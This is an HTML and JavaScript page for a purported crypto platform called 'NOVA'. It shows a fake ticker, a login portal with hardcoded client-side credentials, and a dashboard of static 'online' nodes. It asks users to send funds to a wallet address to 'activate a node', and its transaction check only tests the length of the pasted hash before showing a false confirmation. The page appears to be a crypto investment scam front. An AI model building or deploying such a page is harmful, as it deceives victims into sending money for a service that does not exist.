<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NOVA | Institutional Asset Infrastructure</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #0A192F; --accent: #64FFDA; --card-bg: #112240; --text-main: #CCD6F6; --text-dim: #8892B0; }
        body { margin: 0; font-family: 'Inter', sans-serif; background: var(--primary); color: var(--text-main); }
        
        /* Header & Ticker */
        .ticker { background: #020c1b; color: var(--accent); padding: 8px; font-size: 11px; border-bottom: 1px solid #112240; overflow: hidden; white-space: nowrap; }
        
        /* Layout */
        #landing-page { display: flex; min-height: 100vh; }
        .info-panel { flex: 1.2; padding: 60px; display: flex; flex-direction: column; justify-content: center; }
        .auth-panel { flex: 0.8; display: flex; justify-content: center; align-items: center; background: #020c1b; }
        
        /* Cards & Buttons */
        .auth-card { background: var(--card-bg); padding: 40px; border-radius: 12px; width: 100%; max-width: 350px; border-top: 4px solid var(--accent); }
        .btn-prime { width: 100%; padding: 14px; background: var(--accent); color: var(--primary); border: none; border-radius: 4px; font-weight: 800; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
        
        /* Dashboard Styling */
        #dashboard { display: none; padding: 40px; max-width: 1000px; margin: auto; }
        .node-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px; margin-top: 20px; }
        .node-item { background: #112240; padding: 10px 15px; border-radius: 6px; font-size: 12px; display: flex; justify-content: space-between; border: 1px solid #233554; }
        .status-on { color: var(--accent); font-weight: bold; }

        input, select { width: 100%; padding: 12px; background: #0A192F; border: 1px solid #233554; color: white; border-radius: 4px; margin-bottom: 15px; box-sizing: border-box; }
        @media (max-width: 900px) { #landing-page { flex-direction: column; } }
    </style>
</head>
<body>

    <div class="ticker">
        <marquee>BTC/USD: $64,231.50 (+1.2%) &nbsp;&nbsp; | &nbsp;&nbsp; ETH/USD: $3,452.10 (-0.5%) &nbsp;&nbsp; | &nbsp;&nbsp; NOVA GLOBAL STATUS: SECURE &nbsp;&nbsp; | &nbsp;&nbsp; ACTIVE NODES: 1,842 ONLINE</marquee>
    </div>

    <div id="landing-page">
        <div class="info-panel">
            <h1 style="font-size: 3.5rem; color: var(--accent); margin:0;">NOVA.</h1>
            <p style="color: var(--text-dim); max-width: 500px;">Institutional-grade digital asset infrastructure. Secure your capital with our global node-based distribution protocol.</p>
            <div style="margin-top: 20px; font-size: 0.9rem;">
                <p>🟢 10 Primary Clusters Active</p>
                <p>🔵 5 Verification Layers Online</p>
            </div>
        </div>
        <div class="auth-panel">
            <div class="auth-card">
                <h2 style="text-align: center;">ACCESS PORTAL</h2>
                <input type="text" id="username" placeholder="Identification">
                <input type="password" id="password" placeholder="Security Key">
                <button class="btn-prime" onclick="login()">Authorize Session</button>
            </div>
        </div>
    </div>

    <div id="dashboard">
        <h1 style="color: var(--accent);">TERMINAL ACTIVE</h1>
        
        <h3>Global Infrastructure Nodes (15)</h3>
        <div class="node-grid" id="nodeList">
            </div>

        <div style="background: #112240; padding: 30px; border-radius: 12px; margin-top: 40px; border: 1px solid var(--accent);">
            <h3>Institutional Funding</h3>
            <p style="font-size: 13px;">Transfer funds to the secure managed address below to activate your private node.</p>
            <div style="background: #020c1b; padding: 15px; border-radius: 5px; font-family: monospace; color: var(--accent); margin-bottom: 20px; border: 1px dashed #444;">
                0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2
            </div>
            <input type="text" id="txid" placeholder="Paste Transaction Hash (TXID)">
            <button class="btn-prime" onclick="verifyTX()">Activate Node</button>
        </div>
        <br>
        <button onclick="logout()" style="background:none; color:var(--text-dim); border:none; cursor:pointer;">Terminate Session</button>
    </div>

    <script>
        // Node Data (10 Primary + 5 Backup)
        const nodes = [
            "NV-Alpha (London)", "NV-Beta (Tokyo)", "NV-Gamma (New York)", "NV-Delta (Singapore)", 
            "NV-Epsilon (Frankfurt)", "NV-Zeta (Sydney)", "NV-Eta (Dubai)", "NV-Theta (Paris)", 
            "NV-Iota (Hong Kong)", "NV-Kappa (Zurich)", 
            "V-Layer-1 (Secure)", "V-Layer-2 (Secure)", "V-Layer-3 (Secure)", "V-Layer-4 (Secure)", "V-Layer-5 (Secure)"
        ];

        const list = document.getElementById('nodeList');
        nodes.forEach(node => {
            list.innerHTML += `<div class="node-item"><span>${node}</span><span class="status-on">ONLINE</span></div>`;
        });

        function login() {
            const u = document.getElementById('username').value;
            const p = document.getElementById('password').value;
            if(u === "nova_global" && p === "nova786") {
                localStorage.setItem("session", "active");
                render();
            } else { alert("Access Denied, sweetie."); }
        }

        function verifyTX() {
            const tx = document.getElementById('txid').value;
            if(tx.length > 10) { alert("Verification Started. Node will be active within 30 mins."); }
            else { alert("Enter valid TXID."); }
        }

        function render() {
            if(localStorage.getItem("session") === "active") {
                document.getElementById('landing-page').style.display = 'none';
                document.getElementById('dashboard').style.display = 'block';
            }
        }

        function logout() { localStorage.removeItem("session"); location.reload(); }
        render();
    </script>
</body>
</html>
